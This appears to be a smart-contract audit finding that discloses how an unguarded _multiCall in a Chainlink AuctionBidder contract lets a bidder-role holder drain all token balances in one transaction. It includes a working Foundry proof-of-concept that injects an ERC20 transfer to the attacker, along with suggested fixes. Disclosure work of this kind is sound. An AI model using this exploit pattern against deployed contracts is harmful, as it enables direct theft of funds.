Severity rating *
High severity

Title *
Unguarded _multiCall in auctionCallback enables single-tx drain of all AuctionBidder token balances via arbitrary external call

Links to root cause *

https://github.com/code-423n4/2026-03-chainlink/blob/main/src/AuctionBidder.sol#L97-L112

https://github.com/code-423n4/2026-03-chainlink/blob/main/src/Caller.sol#L49-L62

Vulnerability details *

## Finding description and impact

### Root Cause

`Caller._multiCall()` ([L49-62](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/Caller.sol#L49-L62)) performs a raw `.call()` for every element in its `Call[]` array with no validation on target or selector:

```solidity
// Caller.sol L55-59
for (uint256 i; i < calls.length; ++i) {
    (bool success, bytes memory result) = calls[i].target.call(calls[i].data);
    // ...
}
```

`AuctionBidder.auctionCallback()` ([L97-112](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/AuctionBidder.sol#L97-L112)) `abi.decode`s the user-supplied `data` into `Call[]` and passes it directly to `_multiCall`:

```solidity
// AuctionBidder.sol L105-109
Call[] memory calls = abi.decode(data, (Call[]));
_multiCall(calls);   // ← attacker-controlled targets + calldata execute here
```

The entire call sequence runs as `AuctionBidder`, so any external call made by `_multiCall` executes with the bidder contract as `msg.sender`. This means `ERC20.transfer()` moves tokens **from** the bidder contract's own balance.

### Privilege Escalation

The protocol draws a clear access control boundary:

- **`withdraw()`** → gated by `DEFAULT_ADMIN_ROLE` → only admins can extract tokens
- **`bid()` / `auctionCallback()`** → gated by `AUCTION_BIDDER_ROLE` → intended for auction participation only

`_multiCall` breaks this boundary: a bidder-role holder can execute `transfer(attacker, balance)` as the bidder contract, achieving the same result as `withdraw()` without admin privileges.

### Attack Flow (single transaction)

```
attacker.bid(asset, amount, maliciousSolution)
  └─ BaseAuction.bid()
       └─ auctionCallback(amountOut, data)
            └─ _multiCall([
                 Call(target: LINK, data: transfer(attacker, LINK.balanceOf(self)))
               ])
            └─ LINK.transfer executes as AuctionBidder → funds sent to attacker
            └─ forceApprove(auction, amountOut) ← too late, tokens already gone
```

The drain completes within `auctionCallback` **before** the auction can pull `assetOut`. Unlike the `approve()` variant (which requires a second transaction), this is a single-tx, atomic fund extraction.

### Impact

Direct theft of all ERC20 tokens held by `AuctionBidder`. The contract accumulates balances across auction cycles as it bids on behalf of the protocol. A single malicious `bid()` call drains the entire balance of any targeted token.

Per C4 severity criteria: *"Assets can be stolen/lost/compromised directly."* This meets High because exploitation requires only `AUCTION_BIDDER_ROLE` — an operational role assigned to automated solver bots. A single compromised or malicious bot can drain all funds in one transaction. Not Critical because the role is admin-granted, not permissionless.

## Proof of Concept (PoC)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

/**
 * C-01 PoC: Single-tx drain via arbitrary _multiCall
 * Run: forge test --match-test testC01_DirectDrainViaMultiCall -vvvv
 * Place this file in test/poc/ alongside C4PoC.t.sol
 */
import {C4PoC} from "test/poc/C4PoC.t.sol";
import {Caller} from "src/Caller.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {console2} from "forge-std/console2.sol";

contract C01_PoC is C4PoC {

    function testC01_DirectDrainViaMultiCall() public {
        // --- Setup: start a USDC auction and seed AuctionBidder ---
        uint256 auctionSellAmt = 2_000e6;
        _startAuctionAndSkip(address(mockUSDC), auctionSellAmt, 7_200);

        uint256 linkNeeded   = _getAssetOutAmount(address(mockUSDC), auctionSellAmt);
        uint256 linkReserve  = 10_000e18;   // accumulated LINK from prior auctions
        _fundBidder(linkNeeded + linkReserve);

        uint256 bidderBal  = mockLINK.balanceOf(address(auctionBidder));
        uint256 attackerBal = mockLINK.balanceOf(attacker);
        console2.log("Bidder LINK before (wei):", bidderBal);

        // --- Exploit: inject transfer(attacker, balance) into solution ---
        // _multiCall runs as AuctionBidder, so transfer() sends from bidder
        uint256 drainAmount = mockLINK.balanceOf(address(auctionBidder));
        Caller.Call[] memory drainCalls = new Caller.Call[](1);
        drainCalls[0] = Caller.Call({
            target: address(mockLINK),
            data: abi.encodeWithSelector(
                IERC20.transfer.selector,
                attacker,
                drainAmount
            )
        });

        // attacker holds AUCTION_BIDDER_ROLE (see C4PoC.setUp())
        _bidWithSolution(address(mockUSDC), auctionSellAmt, drainCalls);

        // --- Verify: AuctionBidder is empty, attacker got everything ---
        uint256 bidderAfter   = mockLINK.balanceOf(address(auctionBidder));
        uint256 attackerAfter = mockLINK.balanceOf(attacker);

        assertEq(bidderAfter, 0, "AuctionBidder must be fully drained");
        assertGt(attackerAfter - attackerBal, linkReserve, "attacker received reserve LINK");

        console2.log("Bidder LINK after:", bidderAfter);
        console2.log("Attacker gained (wei):", attackerAfter - attackerBal);
        console2.log("[CONFIRMED] Single-tx drain successful");
    }
}
```

## Recommended mitigation steps

**Option A (simplest — target allowlist):**

```solidity
function auctionCallback(uint256 amountOut, bytes calldata data) external override whenNotPaused {
    ...
    Call[] memory calls = abi.decode(data, (Call[]));
    for (uint256 i = 0; i < calls.length; ++i) {
        require(s_allowedSwapTargets[calls[i].target], "Unauthorized call target");
    }
    _multiCall(calls);
    ...
}
```

**Option B (strongest — remove arbitrary calls):** Replace `_multiCall` in `auctionCallback` with a purpose-built swap function that hardcodes the DEX interaction (e.g., `_executeSwap(router, tokenIn, tokenOut, amount)`) and cannot be repurposed for arbitrary calls.

**Option C (defense-in-depth):** If `_multiCall` must stay, apply both a target allowlist and a selector denylist blocking `transfer`, `transferFrom`, and `approve` on any ERC20 target.
